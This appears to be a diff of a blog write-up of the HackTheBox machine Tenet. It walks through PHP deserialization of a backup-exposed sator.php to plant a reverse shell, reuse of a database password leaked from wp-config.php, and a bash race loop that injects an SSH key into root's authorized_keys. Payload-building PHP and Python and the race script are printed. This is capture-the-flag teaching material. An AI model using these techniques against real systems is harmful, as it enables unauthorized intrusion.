@@ -43,42 +43,41 @@
 		    </section>
 
       <section id="wrapper">
- <section class="wrapper spotlight style6">
-  <div class="inner">
-   <div class="main_image">
-    <img alt="" src="/images/writeups/htb_machines/tenet/tenet.png"/>
-   </div>
-   <div class="content">
-    <h1 class="major">
-     Overview
-    </h1>
-    <p>
-     I am completely confuddled by the ratings of HackTheBox machines lately... Besides Delivery, the latest Easy boxes should of been rated as Medium and vice versa...
-    </p>
-    <p>
-     <em>
-      Tenet was not an exception to this rule.
-     </em>
-    </p>
-    <p>
-     However, I am not gonna lie but I did really enjoy this box! The PHP deserialization attack for initial foothold was simple yet sweet. It was also noice to flex some BashFU for root as well.
-    </p>
-    <p>
-     I will jump straight into it since this is a fairly quick box.
-    </p>
-   </div>
-  </div>
- </section>
- <section class="wrapper style3 alt">
-  <div class="inner">
-   <div class="content">
-    <h2 class="major">
-     Initial Foothold
-    </h2>
-    <p>
-     Now I could of assumed that the box had a web server and SSH open, since most boxes have those ports open. Alas, I went down the conservative route and just did the usual Nmap scan.
-    </p>
-    <pre class="codehilite"><code>Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-17 09:51 AWST
+<section class="wrapper spotlight style3 ">
+<div class="inner">
+<div class="main_image"><img src=/images/writeups/htb_machines/tenet/tenet.png alt="" /></div>
+<div class="content">
+<h1 class="major">
+ Overview
+</h1>
+<p>
+ I am completely confuddled by the ratings of HackTheBox machines lately... Besides Delivery, the latest Easy boxes should of been rated as Medium and vice versa...
+</p>
+<p>
+ <em>
+  Tenet was not an exception to this rule.
+ </em>
+</p>
+<p>
+ However, I am not gonna lie but I did really enjoy this box! The PHP deserialization attack for initial foothold was simple yet sweet. It was also noice to flex some BashFU for root as well.
+</p>
+<p>
+ I will jump straight into it since this is a fairly quick box.
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style2 alt">
+<div class="inner">
+<div class="content">
+
+<h2 class="major">
+ Initial Foothold
+</h2>
+<p>
+ Now I could of assumed that the box had a web server and SSH open, since most boxes have those ports open. Alas, I went down the conservative route and just did the usual Nmap scan.
+</p>
+<pre class="codehilite"><code>Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-17 09:51 AWST
 Nmap scan report for tenet.htb (10.10.10.223)
 Host is up (0.059s latency).
 
@@ -97,132 +96,108 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 9.63 seconds
 </code></pre>
-    <p>
-     Like 99% of the time, the SSH port would not give me an attack vector in
-     <em>
-      (yet)
-     </em>
-     , so I visited the website at http://tenet.htb/ after adding
-     <code>
-      
+<p>
+ Like 99% of the time, the SSH port would not give me an attack vector in
+ <em>
+  (yet)
+ </em>
+ , so I visited the website at http://tenet.htb/ after adding
+ <code>
   tenet.htb
- 
-     </code>
-     to my
-     <code>
-      
+ </code>
+ to my
+ <code>
   /etc/hosts
- 
-     </code>
-     file.
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/htb_machines/tenet/tenetweb.png"/>
-    </p>
-    <p>
-     Seems like another boring Wordpress blog, but it looks like a certain dev called
-     <code>
-      
+ </code>
+ file.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/htb_machines/tenet/tenetweb.png"/>
+</p>
+<p>
+ Seems like another boring Wordpress blog, but it looks like a certain dev called
+ <code>
   neil
- 
-     </code>
-     was peeved off by the main blogger.
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/htb_machines/tenet/poorneil.png"/>
-    </p>
-    <p>
-     If you cannot see the comment from
-     <code>
-      
+ </code>
+ was peeved off by the main blogger.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/htb_machines/tenet/poorneil.png"/>
+</p>
+<p>
+ If you cannot see the comment from
+ <code>
   neil
- 
-     </code>
-     in the screenshot above, here it is.
-    </p>
-    <blockquote>
-     <p>
-      did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!
-     </p>
-    </blockquote>
-    <p>
-     <em>
-      Poor Neil and his plights as a developer.
-     </em>
-    </p>
-    <p>
-     I would of felt more sorry for Neil if he demonstrated better OP sec, but thanks to them I knew I would have to find a file called
-     <code>
-      
+ </code>
+ in the screenshot above, here it is.
+</p>
+<blockquote>
+ <p>
+  did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?!
+ </p>
+</blockquote>
+<p>
+ <em>
+  Poor Neil and his plights as a developer.
+ </em>
+</p>
+<p>
+ I would of felt more sorry for Neil if he demonstrated better OP sec, but thanks to them I knew I would have to find a file called
+ <code>
   sator.php
- 
-     </code>
-     (this was an educated guess).
-    </p>
-    <p>
-     Most of you reading this know that it is good practice to add the domain of the box to
-     <code>
-      
+ </code>
+ (this was an educated guess).
+</p>
+<p>
+ Most of you reading this know that it is good practice to add the domain of the box to
+ <code>
   /etc/hosts
- 
-     </code>
-     for enumeration purposes, for an example
-     <code>
-      
+ </code>
+ for enumeration purposes, for an example
+ <code>
   tenet.htb
- 
-     </code>
-     . What took me a solid hour to realise is that
-     <em>
-      just maybe
-     </em>
-     there is more information on the default site besides the virtual hosts...
-    </p>
-    <p>
-     I spent over an hour fuzzing for
-     <code>
-      
+ </code>
+ . What took me a solid hour to realise is that
+ <em>
+  just maybe
+ </em>
+ there is more information on the default site besides the virtual hosts...
+</p>
+<p>
+ I spent over an hour fuzzing for
+ <code>
   sator.php
- 
-     </code>
-     on
-     <code>
-      
+ </code>
+ on
+ <code>
   tenet.htb
- 
-     </code>
-     , when actuality it was sitting right in front of me at http://10.10.10.223/sator.php ...
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/htb_machines/tenet/sator.png"/>
-    </p>
-    <p>
-     <em>
-      Oooo I surely do like reading about databases on the boxes I am attacking!
-     </em>
-    </p>
-    <p>
-     After wasting about another hour trying to find this backup that
-     <code>
-      
+ </code>
+ , when actuality it was sitting right in front of me at http://10.10.10.223/sator.php ...
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/htb_machines/tenet/sator.png"/>
+</p>
+<p>
+ <em>
+  Oooo I surely do like reading about databases on the boxes I am attacking!
+ </em>
+</p>
+<p>
+ After wasting about another hour trying to find this backup that
+ <code>
   neil
- 
-     </code>
-     mentioned, I finally found the backup of
-     <code>
-      
+ </code>
+ mentioned, I finally found the backup of
+ <code>
   sator.php
- 
-     </code>
-     at http://10.10.10.223/sator.php.bak. If you didn't know this beforehand, the
-     <code>
-      
+ </code>
+ at http://10.10.10.223/sator.php.bak. If you didn't know this beforehand, the
+ <code>
   .bak
- 
-     </code>
-     extension is commonly used on Linux boxes for backup files; which I did forget about for a bit.
-    </p>
-    <pre class="codehilite"><code>&lt;?php
+ </code>
+ extension is commonly used on Linux boxes for backup files; which I did forget about for a bit.
+</p>
+<pre class="codehilite"><code>&lt;?php
 
 class DatabaseExport
 {
@@ -253,52 +228,46 @@ $app -&gt; update_db();
 
 ?&gt;
 </code></pre>
-    <p>
-     <strong>
-      ooooooooooooOOOOOOOOOOOOooooooooooooo
-     </strong>
-    </p>
-    <p>
-     <em>
-      This code looks ripe for a good old PHP deserialization attack!
-     </em>
-    </p>
-    <p>
-     What is PHP serialization you might ask?
-     <s>
-      If you know about it just skip a bit.
-     </s>
-    </p>
-    <p>
-     Well, the simplified question is how do you send the state of an instance of a class in Object Oriented Programming (OOP) languages? In PHP, this is done by expressing the state of the instance as a formatted string.
-    </p>
-    <p>
-     Alright hear me out, let us use the code of
-     <code>
-      
+<p>
+ <strong>
+  ooooooooooooOOOOOOOOOOOOooooooooooooo
+ </strong>
+</p>
+<p>
+ <em>
+  This code looks ripe for a good old PHP deserialization attack!
+ </em>
+</p>
+<p>
+ What is PHP serialization you might ask?
+ <s>
+  If you know about it just skip a bit.
+ </s>
+</p>
+<p>
+ Well, the simplified question is how do you send the state of an instance of a class in Object Oriented Programming (OOP) languages? In PHP, this is done by expressing the state of the instance as a formatted string.
+</p>
+<p>
+ Alright hear me out, let us use the code of
+ <code>
   sator.php
- 
-     </code>
-     as an example and get the serialized string of the
-     <code>
-      
+ </code>
+ as an example and get the serialized string of the
+ <code>
   $app
- 
-     </code>
-     instance of
-     <code>
-      
+ </code>
+ instance of
+ <code>
   DatabaseExport
- 
-     </code>
-     using the below code snippet.
-    </p>
-    <p>
-     <em>
-      payload_gen.php
-     </em>
-    </p>
-    <pre class="codehilite"><code>&lt;?php
+ </code>
+ using the below code snippet.
+</p>
+<p>
+ <em>
+  payload_gen.php
+ </em>
+</p>
+<pre class="codehilite"><code>&lt;?php
 
 class DatabaseExport
 {
@@ -325,99 +294,81 @@ echo serialize($app)."\n";
 
 ?&gt;
 </code></pre>
-    <pre class="codehilite"><code>ghostccamm@kali:~/Desktop/hackthebox/machines/tenet/get_init$ php payload_gen.php
+<pre class="codehilite"><code>ghostccamm@kali:~/Desktop/hackthebox/machines/tenet/get_init$ php payload_gen.php
 O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"users.txt";s:4:"data";s:7:"Success";}
 </code></pre>
-    <p>
-     So we can now see how the objects of the
-     <code>
-      
+<p>
+ So we can now see how the objects of the
+ <code>
   DatabaseExport
- 
-     </code>
-     class are serialized.
-    </p>
-    <ul>
-     <li>
-      The 'O' at the start is to signal that the serialized string is an Object of a class.
-     </li>
-     <li>
-      The '14' is the number of letters in the name of the Class that the Object is an instance of. In this case it is
-      <code>
-       
+ </code>
+ class are serialized.
+</p>
+<ul>
+ <li>
+  The 'O' at the start is to signal that the serialized string is an Object of a class.
+ </li>
+ <li>
+  The '14' is the number of letters in the name of the Class that the Object is an instance of. In this case it is
+  <code>
    DatabaseExport
-  
-      </code>
-      .
-     </li>
-     <li>
-      The '2' is the number of properties that the object has.
-     </li>
-    </ul>
-    <p>
-     The following '
-     <code>
-      
+  </code>
+  .
+ </li>
+ <li>
+  The '2' is the number of properties that the object has.
+ </li>
+</ul>
+<p>
+ The following '
+ <code>
   {}
- 
-     </code>
-     ' block then expresses the names of the properties and the values of them as well. So for the
-     <code>
-      
+ </code>
+ ' block then expresses the names of the properties and the values of them as well. So for the
+ <code>
   user_file
- 
-     </code>
-     property of
-     <code>
-      
+ </code>
+ property of
+ <code>
   $app
- 
-     </code>
-     , the name of the property is a string (
-     <code>
-      
+ </code>
+ , the name of the property is a string (
+ <code>
   s
- 
-     </code>
-     ) and is 9 characters and its value is also string.
-    </p>
-    <p>
-     Still confused? You probably are since I only gave a brief introduction on PHP object serialization. Check out this
-     <a href="https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a">
-      Medium Article by Vickie Li
-     </a>
-     where she went into far greater detail about PHP serialization and how you can exploit it.
-    </p>
-    <p>
-     Getting back to Tenet now, we can modify the
-     <code>
-      
+ </code>
+ ) and is 9 characters and its value is also string.
+</p>
+<p>
+ Still confused? You probably are since I only gave a brief introduction on PHP object serialization. Check out this
+ <a href="https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a">
+  Medium Article by Vickie Li
+ </a>
+ where she went into far greater detail about PHP serialization and how you can exploit it.
+</p>
+<p>
+ Getting back to Tenet now, we can modify the
+ <code>
   user_file
- 
-     </code>
-     and
-     <code>
-      
+ </code>
+ and
+ <code>
   data
- 
-     </code>
-     properties from the serialized string we send using the GET parameter
-     <code>
-      
+ </code>
+ properties from the serialized string we send using the GET parameter
+ <code>
   arepo
- 
-     </code>
-     .
-    </p>
-    <p>
-     <strong>
-      This means that we can save a PHP file onto the webserver!
-     </strong>
-    </p>
-    <p>
-     I wrote a neat little Python script that will construct the payload that I will send to the server. The serialized string needed to be URL encoded as well, since it is sent as a GET parameter in the URL.
-    </p>
-    <pre class="codehilite"><code>import sys, urllib.parse
+ </code>
+ .
+</p>
+<p>
+ <strong>
+  This means that we can save a PHP file onto the webserver!
+ </strong>
+</p>
+<p>
+ I wrote a neat little Python script that will construct the payload that I will send to the server. The serialized string needed to be URL encoded as well, since it is sent as a GET parameter in the URL.
+</p>
+<pre class="codehilite"><code>import sys, urllib.parse
 
 def main(filename):
     lines = []
@@ -441,54 +392,49 @@ if __name__ == "__main__":
 
     main(filename)
 </code></pre>
-    <p>
-     I then just piped the
-     <code>
-      
+<p>
+ I then just piped the
+ <code>
   php-reverse-shell.php
- 
-     </code>
-     file that comes pre-packaged with Kali Linux as my payload and uploaded it onto the box.
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/htb_machines/tenet/exploit.png"/>
-    </p>
-    <p>
-     Now chucking that payload into the
-     <code>
-      
+ </code>
+ file that comes pre-packaged with Kali Linux as my payload and uploaded it onto the box.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/htb_machines/tenet/exploit.png"/>
+</p>
+<p>
+ Now chucking that payload into the
+ <code>
   http://10.10.10.223/sator.php?arepo=&lt;payload here&gt;
- 
-     </code>
-     , I was able to upload my reverse shell and get initial foothold!
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/htb_machines/tenet/noicegotrs.png"/>
-    </p>
-    <p>
-     <strong>
-      nooooOOOooooiice
-     </strong>
-    </p>
-   </div>
-  </div>
- </section>
- <section class="wrapper style2">
-  <div class="inner">
-   <div class="content">
-    <h1 class="major">
-     Getting User
-    </h1>
-    <p>
-     Well after all of this talk about databases, I decided to look for some database credentials. Heading over to
-     <code>
-      
+ </code>
+ , I was able to upload my reverse shell and get initial foothold!
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/htb_machines/tenet/noicegotrs.png"/>
+</p>
+<p>
+ <strong>
+  nooooOOOooooiice
+ </strong>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style5 ">
+<div class="inner">
+<div class="content">
+
+<h1 class="major">
+ Getting User
+</h1>
+<p>
+ Well after all of this talk about databases, I decided to look for some database credentials. Heading over to
+ <code>
   /var/www/html/wordpress/wp-config.php
- 
-     </code>
-     I found what I was looking for.
-    </p>
-    <pre class="codehilite"><code>$ cat /var/www/html/wordpress/wp-config.php
+ </code>
+ I found what I was looking for.
+</p>
+<pre class="codehilite"><code>$ cat /var/www/html/wordpress/wp-config.php
 &lt;?php
 /**
  * The base configuration for WordPress
@@ -519,85 +465,76 @@ define( 'DB_USER', 'neil' );
 /** MySQL database password */
 define( 'DB_PASSWORD', 'Opera2112' );
 </code></pre>
-    <p>
-     Now I would normally check the contents of the database first, but for some reason I decided to see if I could login as
-     <code>
-      
+<p>
+ Now I would normally check the contents of the database first, but for some reason I decided to see if I could login as
+ <code>
   neil
- 
-     </code>
-     with the password "Opera2112" (oh by the way he is a user on the box).
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/htb_machines/tenet/dbpass.png"/>
-    </p>
-    <p>
-     <strong>
-      Lo and behold! I got neil's account!
-     </strong>
-    </p>
-    <p>
-     To be honest, I felt like wasted all that time with the enumeration and PHP serialization attack that I did earlier where I could of easily bruteforced neil's password with a good educated guess of the password...
-    </p>
-    <p>
-     <em>
-      Like "Opera" is literally in the icon for the box...
-     </em>
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/htb_machines/tenet/tenet.png"/>
-    </p>
-    <p>
-     Oh well... I learnt the lesson to always blast boxes with
-     <code>
-      
+ </code>
+ with the password "Opera2112" (oh by the way he is a user on the box).
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/htb_machines/tenet/dbpass.png"/>
+</p>
+<p>
+ <strong>
+  Lo and behold! I got neil's account!
+ </strong>
+</p>
+<p>
+ To be honest, I felt like wasted all that time with the enumeration and PHP serialization attack that I did earlier where I could of easily bruteforced neil's password with a good educated guess of the password...
+</p>
+<p>
+ <em>
+  Like "Opera" is literally in the icon for the box...
+ </em>
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/htb_machines/tenet/tenet.png"/>
+</p>
+<p>
+ Oh well... I learnt the lesson to always blast boxes with
+ <code>
   hydra
- 
-     </code>
-     and ignore HackTheBox rules. I assume some script kiddie out there was pretty darn happy that for the first time ever bruteforcing SSH works from the very start (if they had a big enough brain to make a good enough wordlist).
-    </p>
-   </div>
-  </div>
- </section>
- <section class="wrapper style5 alt">
-  <div class="inner">
-   <div class="content">
-    <h1 class="major">
-     Getting Root
-    </h1>
-    <p>
-     After I got in as
-     <code>
-      
+ </code>
+ and ignore HackTheBox rules. I assume some script kiddie out there was pretty darn happy that for the first time ever bruteforcing SSH works from the very start (if they had a big enough brain to make a good enough wordlist).
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style6 alt">
+<div class="inner">
+<div class="content">
+
+<h1 class="major">
+ Getting Root
+</h1>
+<p>
+ After I got in as
+ <code>
   neil
- 
-     </code>
-     , one of the first things I checked was running
-     <code>
-      
+ </code>
+ , one of the first things I checked was running
+ <code>
   sudo -l
- 
-     </code>
-     .
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/htb_machines/tenet/oooowotsthisthesecond.png"/>
-    </p>
-    <p>
-     Well that sudoers entry looked way to juicy to ignore, so I took a closer look at
-     <code>
-      
+ </code>
+ .
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/htb_machines/tenet/oooowotsthisthesecond.png"/>
+</p>
+<p>
+ Well that sudoers entry looked way to juicy to ignore, so I took a closer look at
+ <code>
   /usr/local/bin/enableSSH.sh
- 
-     </code>
-     .
-    </p>
-    <p>
-     <em>
-      enableSSH.sh
-     </em>
-    </p>
-    <pre class="codehilite"><code>neil@tenet:~$ cat /usr/local/bin/enableSSH.sh
+ </code>
+ .
+</p>
+<p>
+ <em>
+  enableSSH.sh
+ </em>
+</p>
+<pre class="codehilite"><code>neil@tenet:~$ cat /usr/local/bin/enableSSH.sh
 #!/bin/bash
 
 checkAdded() {
@@ -650,47 +587,37 @@ key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6i
 addKey
 checkAdded
 </code></pre>
-    <p>
-     Oh that is a pretty neat
-     <s>
-      but so unrealistic
-     </s>
-     bash script there. I immediately noticed that the key stored inside at
-     <code>
-      
+<p>
+ Oh that is a pretty neat
+ <s>
+  but so unrealistic
+ </s>
+ bash script there. I immediately noticed that the key stored inside at
+ <code>
   /tmp/ssh-XXXXXXXX
- 
-     </code>
-     is then copied to
-     <code>
-      
+ </code>
+ is then copied to
+ <code>
   /root/.ssh/authorized_keys
- 
-     </code>
-     , which was exactly what I wanted. Only thing was that I wouldn't know the name of temp file preemptively, but if I was quick I could chuck in my SSH public key instead of the one in
-     <code>
-      
+ </code>
+ , which was exactly what I wanted. Only thing was that I wouldn't know the name of temp file preemptively, but if I was quick I could chuck in my SSH public key instead of the one in
+ <code>
   enableSSH.sh
- 
-     </code>
-     .
-    </p>
-    <p>
-     I decided to bust out my BashFU and try to get my SSH key in. I used the command
-     <code>
-      
+ </code>
+ .
+</p>
+<p>
+ I decided to bust out my BashFU and try to get my SSH key in. I used the command
+ <code>
   find /tmp -name "ssh-*" -maxdepth 1 2&gt;/dev/null
- 
-     </code>
-     to list all of the temp ssh files and just piped my SSH key into them. Below is my exploit bash script that I wrote and uploaded to the box. I knew that it had executed successfully if when I ran
-     <code>
-      
+ </code>
+ to list all of the temp ssh files and just piped my SSH key into them. Below is my exploit bash script that I wrote and uploaded to the box. I knew that it had executed successfully if when I ran
+ <code>
   sudo enableSSH.sh
- 
-     </code>
-     it returned back with "Error in adding $sshName to authorized_keys file!".
-    </p>
-    <pre class="codehilite"><code>while :;
+ </code>
+ it returned back with "Error in adding $sshName to authorized_keys file!".
+</p>
+<pre class="codehilite"><code>while :;
 do
     files=`find /tmp -name "ssh-*" -maxdepth 1 2&gt;/dev/null`
     for p in $files
@@ -700,47 +627,47 @@ do
     done
 done
 </code></pre>
-    <p>
-     <img alt="" class="center" src="/images/writeups/htb_machines/tenet/letsgetroot.png"/>
-    </p>
-    <p>
-     <strong>
-      nnnnoooooooOOOOOooooooooooiiiiccceeee
-     </strong>
-    </p>
-    <p>
-     All that was left to do was SSH in.
-    </p>
-    <p>
-     <img alt="" class="center" src="/images/writeups/htb_machines/tenet/aywegotroot.png"/>
-    </p>
-    <p>
-     <strong>
-      nnnnooooooo000000000OOOOOOOOOO000000000ooooooooooiiiiccceeee
-     </strong>
-    </p>
-   </div>
-  </div>
- </section>
- <section class="wrapper style1">
-  <div class="inner">
-   <div class="content">
-    <h1 class="major">
-     Conclusion
-    </h1>
-    <p>
-     Yeah this was a definitely a fun, quick, nice box. Although it was (once again) more like playing a CTF than something realistic, it was still an enjoyable and educational experience. I knew about PHP deserialization attacks beforehand from watching YouTube videos on the topic
-     <s>
-      (Papa Bless you IppSec)
-     </s>
-     , but I never done one in HackTheBox before.
-    </p>
-    <p>
-     Cheers for the sweet box egotisticalSW!
-    </p>
-   </div>
-  </div>
- </section>
+<p>
+ <img alt="" class="center" src="/images/writeups/htb_machines/tenet/letsgetroot.png"/>
+</p>
+<p>
+ <strong>
+  nnnnoooooooOOOOOooooooooooiiiiccceeee
+ </strong>
+</p>
+<p>
+ All that was left to do was SSH in.
+</p>
+<p>
+ <img alt="" class="center" src="/images/writeups/htb_machines/tenet/aywegotroot.png"/>
+</p>
+<p>
+ <strong>
+  nnnnooooooo000000000OOOOOOOOOO000000000ooooooooooiiiiccceeee
+ </strong>
+</p>
+</div>
+</div>
+</section>
+<section class="wrapper style1 ">
+<div class="inner">
+<div class="content">
+
+<h1 class="major">
+ Conclusion
+</h1>
+<p>
+ Yeah this was a definitely a fun, quick, nice box. Although it was (once again) more like playing a CTF than something realistic, it was still an enjoyable and educational experience. I knew about PHP deserialization attacks beforehand from watching YouTube videos on the topic
+ <s>
+  (Papa Bless you IppSec)
+ </s>
+ , but I never done one in HackTheBox before.
+</p>
+<p>
+ Cheers for the sweet box egotisticalSW!
+</p></div>
+</div>
+</section>
 </section>
 
     	</div>
